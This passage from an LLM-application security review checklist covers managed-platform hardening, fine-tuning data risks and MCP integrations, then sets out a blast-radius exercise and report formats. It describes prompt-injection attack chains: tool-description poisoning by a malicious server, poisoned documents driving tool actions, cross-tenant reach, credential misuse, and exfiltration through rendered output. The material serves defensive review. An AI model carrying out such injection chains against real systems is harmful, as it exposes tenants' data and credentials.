- *Source:* config · *Severity:* High · *OWASP:* LLM04

**H5. On a managed platform, is the platform's isolation and logging configuration explicit?**
- *Look for:* IaC for the managed service: private endpoints/VPC configuration, customer-managed keys, invocation logging, guardrail features enabled or left off.
- *Pass:* configuration explicit in IaC and reviewed, not left at defaults.
- *Fail:* platform resources created with default networking and logging disabled.
- *Source:* config · *Severity:* High · *OWASP:* LLM06

**H6. Are supporting ML platform components exposed?**
- *Look for:* experiment trackers, model registries, notebook servers, orchestration dashboards, metrics endpoints in IaC and service definitions; check authentication on each.
- *Pass:* all supporting services authenticated and network-restricted.
- *Fail:* any registry, tracker, notebook, or dashboard reachable without authentication.
- *Source:* config · *Severity:* Critical · *OWASP:* LLM04
- *Note:* the surrounding ML tooling is routinely less hardened than the application, while holding credentials, artifacts, and a map of the environment.

### Branch F: Fine-Tuned or Customer-Adapted Models

**F1. What data was used for tuning, and was its classification and consent basis established?**
- *Look for:* training data pipelines, dataset references, preprocessing code, and any documentation of sourcing.
- *Pass:* documented provenance with a classification review and a lawful basis for the data used.
- *Fail:* tuning datasets assembled from production data without a documented classification or consent review.
- *Source:* code, docs · *Severity:* High · *OWASP:* LLM05, LLM02

**F2. Was sensitive content removed from tuning data before training?**
- *Look for:* scrubbing, PII detection, secret scanning in the data preparation pipeline.
- *Pass:* an explicit filtering stage with verification.
- *Fail:* raw production data used directly.
- *Source:* code · *Severity:* High · *OWASP:* LLM02
- *Note:* anything in the tuning set is a candidate for verbatim regurgitation later, and cannot be deleted from the weights without retraining.

**F3. If adapters are per-tenant, how is the correct adapter bound to the request?**
- *Look for:* adapter selection and loading logic, caching behavior, and concurrency handling in the serving path.
- *Pass:* adapter derived from the verified session identity, with isolation verified under concurrent multi-tenant load.
- *Fail:* adapter chosen from client-supplied input, or a shared cache that can serve a mismatched adapter under concurrency.
- *Source:* code · *Severity:* Critical · *OWASP:* LLM02

**F4. Has the tuned model been tested for memorization of its training data?**
- *Look for:* extraction or memorization tests in the evaluation suite.
- *Pass:* memorization testing performed with documented results.
- *Fail:* no testing, on a model tuned on sensitive data.
- *Source:* code, docs · *Severity:* Medium · *OWASP:* LLM02

**F5. Is there a defined path to remove a customer's data from a tuned model?**
- *Look for:* retraining pipeline, base-model checkpoints retained, documented deletion procedure and its realistic timeline.
- *Pass:* an executable retraining path from a clean base, with the timeline documented honestly.
- *Fail:* deletion commitments that cannot technically be met for content absorbed into weights.
- *Source:* code, docs · *Severity:* High · *OWASP:* LLM02

### Branch M: MCP and External Integrations

**M1. Which MCP servers or external tool providers are configured, and who controls them?**
- *Look for:* MCP client configuration, server manifests, transport (stdio, HTTP), and the origin of each server (first-party, vendor, community).
- *Pass:* an explicit allowlist of pinned, first-party or vetted servers.
- *Fail:* servers resolvable at runtime, community servers used unvetted, or configuration permitting arbitrary server addition.
- *Source:* code, config · *Severity:* Critical · *OWASP:* LLM04

**M2. Are tool descriptions from external servers treated as untrusted content?**
- *Look for:* how tool names, descriptions, and schemas retrieved from an MCP server reach the prompt.
- *Pass:* descriptions pinned or validated against a known-good definition at load, with changes requiring review.
- *Fail:* descriptions fetched at runtime and injected into the prompt verbatim.
- *Source:* code · *Severity:* Critical · *OWASP:* LLM01, LLM04
- *Note:* tool poisoning. A server's tool *description* is injected into the model's context, so a compromised or malicious server can place instructions there directly, without the tool ever being invoked.

**M3. What credentials are passed to external servers, and what is their scope?**
- *Look for:* credential passing in the MCP client configuration, whether tokens are per-user or shared, and the scope granted.
- *Pass:* narrowly scoped, per-user delegated credentials, with the external server unable to act beyond the current user's authority.
- *Fail:* broad shared tokens handed to third-party-controlled servers.
- *Source:* code, config · *Severity:* Critical · *OWASP:* LLM06

**M4. Is external server output validated before it re-enters the reasoning loop?**
- *Look for:* handling of MCP tool results in the agent loop, same treatment as T5.
- *Pass:* results delimited, size-bounded, and schema-validated.
- *Fail:* results injected as trusted context.
- *Source:* code · *Severity:* High · *OWASP:* LLM01, LLM10

**M5. Are external integrations pinned by version and monitored for change?**
- *Look for:* version pinning of MCP servers and their dependencies; any detection of changed tool definitions between deploys.
- *Pass:* pinned versions with a check that fails the build on unexpected definition changes.
- *Fail:* floating versions, so an upstream change silently alters the tool surface in production.
- *Source:* config · *Severity:* High · *OWASP:* LLM04

---

## Part 4: Blast Radius Exercise

The central test of the review. Everything above establishes what controls exist; this establishes what happens when they are bypassed.

**Premise:** assume an attacker achieves complete control of model output. Do not debate how likely this is. Indirect prompt injection through any ingestion path, any tool result, or any user-supplied document makes it achievable, and no guardrail is a reliable barrier. Treat total model compromise as a given and determine what it reaches.

This is mechanical. Work from artifacts already produced, not from discussion.

### Procedure

**B1. Enumerate the action surface.** From the D5 tool table, list every action the model can cause. For each, record: the credential used, the scope of that credential, whether the action is reversible, and what data it touches.

**B2. Enumerate the output surface.** From U13, list every consumer of model output: renderers, parsers, execution sinks, downstream API calls, storage writes, message senders. For each, record what an attacker controlling the output string achieves at that consumer.

**B3. Enumerate the read surface.** From R1, R8, and U2, determine what data the model can cause to be loaded into context. Where authorization is enforced post-retrieval or not at all, the read surface is the entire store, not the user's slice of it.

**B4. Construct the chains.** For each entry point, trace the reachable path forward. The common shapes:
  - poisoned document → retrieval → context → tool invocation → external action
  - user-supplied file → ingestion → index → another tenant's query → their context
  - compromised external server → tool description → context → credential use
  - model output → renderer → browser → exfiltration via auto-loaded resource

**B5. State the result plainly.** Complete this sentence with everything that applies, citing the evidence for each: *"An attacker who achieves prompt injection in this system can ___."*

**B6. Test against the three red lines.** Any `yes` is a Critical finding regardless of what controls sit upstream:

| Red line | Question |
|---|---|
| **Cross-tenant reach** | Can a single injection cause data belonging to another tenant to be read or written? |
| **Irreversible action** | Can a single injection cause an action that cannot be undone, with no server-side human gate? |
| **Credential reach** | Can a single injection cause credential material to be used beyond the invoking user's authority, or disclosed? |

**B7. Classify the containment posture.**

| Posture | Definition |
|---|---|
| **Contained** | Injection reaches only the invoking user's own data and reversible actions. |
| **Bounded** | Injection reaches beyond the user's own data or causes irreversible action, but a server-side enforcement point limits scope. |
| **Unbounded** | Injection crosses a red line with no enforcement point between the model and the consequence. |

A system that is `Unbounded` should not ship in that state regardless of how many other questions passed. This classification, with its supporting chain, is the single most useful output of the review for an executive audience.

---

## Part 5: Verification Queue

The ten items below map to questions you have already answered. Each names a flaw that the application's existing scanning and penetration testing cannot structurally detect, which means your answer is the only signal available for it. Emit them as a separate table so a human can confirm each claim by hand.

| S-ID | Item | Linked question |
|---|---|---|
| S1 | Model output reaching an execution sink | U14 |
| S2 | Authorization sequencing in retrieval | R1 |
| S3 | Credential scope on tool handlers | T1 |
| S4 | Guardrails existing only as prompt text | U17, D7 |
| S5 | Fail-open guardrails | U17, U23 |
| S6 | Client-supplied conversation history | U7 |
| S7 | Rendered-output exfiltration channels | U15 |
| S8 | Tenant scoping via string interpolation | R8 |
| S9 | Indirect injection through an ingestion path | R3, R4 |
| S10 | Tool-description poisoning from an external server | M2 |

Output format:

```
S-ID | LINKED QUESTION | STATUS | EVIDENCE | HUMAN VERIFIED (y/n)
```

Carry the status and evidence forward from the linked question. Where an item maps to more than one question, report the weaker of the two statuses. Leave the final column blank, it is completed by the human reviewer. Omit rows whose linked question is `N/A` because its branch was not selected.

---

## Part 6: Findings and Report

### Severity rubric

Conventional severity scoring fits these findings poorly. Rate on three axes, then take the highest applicable row.

| Severity | Criteria |
|---|---|
| **Critical** | Crosses a Part 4 red line: cross-tenant reach, irreversible action without a server-side gate, or credential use beyond the invoking user's authority. Also: unauthenticated reach to any model-invoking or inference endpoint. |
| **High** | Enforcement absent at a trust boundary where it belongs, but a compensating control bounds the outcome. Sensitive data exposure limited to the invoking tenant. Controls present on some paths but not all. |
| **Medium** | Defense-in-depth gap with no direct path to data or action impact. Detection and response limitations. Cost and availability exposure. |
| **Low** | Hardening opportunity. No realistic path to impact given controls verified elsewhere in the review. |

Two modifiers, applied after the base rating:

- **Raise one level** where the flaw is reachable through indirect injection with no authentication required, since the attacker never needs access to the application.
- **Do not lower** a rating on the basis of a control that is `RUNTIME_DEPENDENT` and unverified. Record it as conditional and state what deployment evidence would justify the reduction.

### Finding format

```
ID:          <question ID>
Title:       <one line, states the defect, not the remediation>
Severity:    Critical | High | Medium | Low
Status:      FAIL | PARTIAL
Evidence:    <file:line> + quoted code
Mechanism:   <how an attacker reaches this, in one or two sentences>
Impact:      <what they obtain or cause, tied to Part 4 where applicable>
Remediation: <the architectural change, not a code patch, where the two differ>
Boundary:    <which trust boundary this belongs to>
OWASP 2026:  <LLMxx>
```

Remediation should name the layer the control belongs at. "Validate tool arguments" is a patch; "tool handlers must resolve resource identifiers against the invoking user's permissions before acting" is an architectural position that survives the next refactor.

### Report structure

1. **Containment posture**: the Part 4 classification and the chain that demonstrates it. Lead with this.
2. **Architecture summary**: three subsections, all drawn from Part 1, so a reader can see exactly what was reviewed.
   - **Component inventory**: the D1 through D12 findings, including model providers and versions, inference topology, orchestration framework, retrieval stack, the full tool table from D5, data stores, external integrations, and tenancy model.
   - **Trust boundaries identified**: each boundary located in the system, with the code path where the crossing occurs.
   - **Branches selected**: which of R, T, E, H, F, M apply, each with the discovery evidence that selected it, and which were ruled out with the evidence that ruled them out.
3. **Findings**: ordered by severity, in the format above.
4. **Undetermined items**: every `UNDETERMINED` answer, what was searched, and what evidence would resolve it. This section is not an admission of incompleteness; it is the honest scope statement, and it is where the next review starts.
5. **Runtime verification list**: every `RUNTIME_DEPENDENT` item requiring confirmation against the live deployment rather than the repository.
6. **Coverage statement**: commit SHA reviewed, paths in and out of scope, documentation consulted.
7. **Recommendation**: go, conditional go with named compensating controls and owners, or no-go with the specific findings that must close first.
8. **Appendix A, answer register**: every applicable question with its status and evidence pointer. See below.
9. **Appendix B, verification queue**: the Part 5 table, with the human-verified column completed.

### Answer register

Sections 3 through 5 above carry only findings, undetermined items, and runtime-dependent items. A question that passed appears in none of them, which leaves the report unable to distinguish *asked and passed* from *never asked*. The register closes that gap and is the artifact an auditor or a re-review will actually diff against.

Open it with a coverage summary:

```
Applicable: 49 of 65   Pass: 31   Fail: 6   Partial: 4   Undetermined: 5   Runtime-dependent: 3   N/A: 16
```

Then one row per applicable question, in document order:

| ID | Question | Answer | Status | Severity | Evidence |
|---|---|---|---|---|---|

Rules for the register:

- **Question**: reproduce the question text exactly as written in Parts 2 and 3. Do not shorten, paraphrase, or retitle it. The register must be readable without the source document open beside it.
- **Answer**: one or two plain sentences describing what the system actually does. Write for a reader who is not an engineer. Describe the mechanism, not the code. "Tenants share a single index, and separation relies on a metadata filter applied after the search runs" is a good answer. "`index.query` is called without a filter kwarg" is not, that belongs in the evidence column. An `UNDETERMINED` row still gets an answer: say what could not be established and why.
- **Status**: one of the Part 0 statuses.
- **Severity**: only for `FAIL` and `PARTIAL`. Leave empty otherwise.
- **Evidence**: the `file:line` pointer. For `FAIL` and `PARTIAL` rows, also link the finding ID from section 3 so the detail lives in one place rather than being duplicated here.

Questions marked `N/A` are listed after the table, grouped by branch with the discovery evidence that ruled the branch out, rather than itemised row by row.

Follow the register with a short search coverage table, one row per Critical-severity question answered `PASS`. This is the artifact that lets a human distinguish a thorough clean result from a shallow one, and it is the difference between a reviewed control and an assumed one:

| ID | Paths and patterns searched | Candidates examined | Basis for concluding the cited implementation is the only one |
|---|---|---|---|
